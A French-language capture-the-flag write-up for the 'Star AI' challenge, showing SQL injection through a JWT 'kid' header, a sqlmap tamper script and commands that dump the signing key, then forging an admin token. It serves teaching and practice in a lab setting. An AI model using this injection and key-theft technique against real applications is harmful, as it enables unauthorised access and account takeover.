---
title: "Star AI"
date: 2023-12-06T09:03:20-08:00
draft: false
---

# Cybersecurity Business Convention 2023 - Star AI - *400 pts*

## Énoncé

Ce site de génération d'images d'étoiles peut sembler innocent à permière vue, mais j'ai eu vent que son propriétaire avait caché des données sensibles et s'en servait de point d'exfiltration.

Devenez "admin" de la plateforme pour en savoir plus.

## Solution

Le challenge commence sur le site de Star AI, qui revendique simplement être une API de génération d'images.

![Site](/images/004/01.png)

On remarque en haut à droite une fonction API qui nous redirige vers un endpoint GET /api/tielles, qui nous renvoie une image aléatoire d'astrophotographie.

![API](/images/004/02.png)

Si l'on observe les requêtes qui passent avec un proxy (type Burp Suite), on peut remarquer que l'API nous attribue un jeton d'authentification lors de la visite de l'endpoint `/api/getToken`, qui nous redirige ensuite vers `/api/star`.

![GetToken](/images/004/03.png)

Lorsque l'on décode le JWT, on se rend compte qu'il ne contient que très peu d'informations. Le seul header un peu inhabituel est le header `kid`, qui contient un GUID qui semble ne pas changer entre plusieurs tokens.

![Decoded JWT](/images/004/04.png)

Si l'on ne connaît pas le fonctionnement du paramètre `kid` dans un JWT, une petite recherche Google nous permet de retrouver la RFC ou d'autres ressources qui nous expliquent que le `kid` est un paramètre qui sert à indiquer au serveur quelle clé est utilisée pour signer le token en question.

Cependant, selon la RFC, il n'y a pas de méthode d'implémentation préconisée. Il est donc possible que le challenge repose sur une mauvaise implémentation de ce paramètre.

Selon l'implémentation, le stockage de la clé peut se faire en BDD, sur le FS, ou même à l'exterieur de la machine.

Ici, lorsqu'on joue un peu avec le paramètre KID, on se retrouve avec une erreur qui nous indique que le `kid` est invalide.

![Invalid KID 1](/images/004/05.png)

![Invalid KID 2](/images/004/06.png)

Au bout de quelques tests, on se rend compte que la clé est stockée en base de données, car on est en mesure de provoquer une erreur SQL en insérant le caractère `'`

![SQL Error 1](/images/004/07.png)

![SQL Error 2](/images/004/08.png)

Nous sommes sûrement en face d'une injection SQL. Il est possible de tester ça à la main, mais j'aime bien sortir mon `sqlmap` de temps en temps.

L'exploitation avec `sqlmap` est automatique, mais elle ne fonctionnera pas sans lui donner des indications précises sur l'endroit et la façon d'injecter notre SQL.

Pour que `sqlmap` puisse faire tranquillement son travail, nous allons avoir besoin de créer un tamper script, qui va altérer son comportement comme on le souhaite.

On crée le script `/usr/share/sqlmap/tamper/jwtkid.py` et on peut le faire de cette façon :

```python
#!/usr/bin/env python

from lib.core.enums import PRIORITY
import base64

__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    encoded = str('{"alg":"HS256","typ":"JWT","kid":"'+payload+'"}').encode('ascii')
    base = base64.b64encode(encoded)
    return base.decode('ascii')
```

Ensuite, on copie la requête que l'on veut faire depuis `Burp Suite` dans un fichier, pour la passer à `sqlmap` ensuite, et marquer l'endroit où on veut faire notre injection avec le caractère `*`

![Requête](/images/004/09.png)

Ici, j'ai remplacé la première partie du JWT par l'injection. Il ne reste plus qu'a le laisser faire son travail :)

```bash
sqlmap -r [fichier_requete] --ignore-code 401 --tamper jwtkid.py
```

![SQLmap 1](/images/004/10.png)

L'injection a été trouvée, on peut maintenant dumper le contenu de la BDD.

```bash
sqlmap -r [fichier_requete] --ignore-code 401 --tamper jwtkid.py --dbs
```

![SQLmap 2](/images/004/11.png)

```bash
sqlmap -r [fichier_requete] --ignore-code 401 --tamper jwtkid.py -D starai --tables
```

![SQLmap 3](/images/004/12.png)

```bash
sqlmap -r [fichier_requete] --ignore-code 401 --tamper jwtkid.py -D starai -T JWTkeys --dump
```

![SQLmap 4](/images/004/13.png)

Nous somes maintenant en possession de la clé pour signer les JWT de l'application ! Il ne reste plus qu'a se forger notre propre token pour obtenir les droits `admin`.

![JWT Forge](/images/004/14.png)

On rejoue une simple requête sur l'endpoint `/api/star` avec ce nouveau token, et on obtient le flag !

![Flag](/images/004/15.png)

*FLAG : CBC{J\*\*\*\*\*\*\*\*\*\*\*\*}*
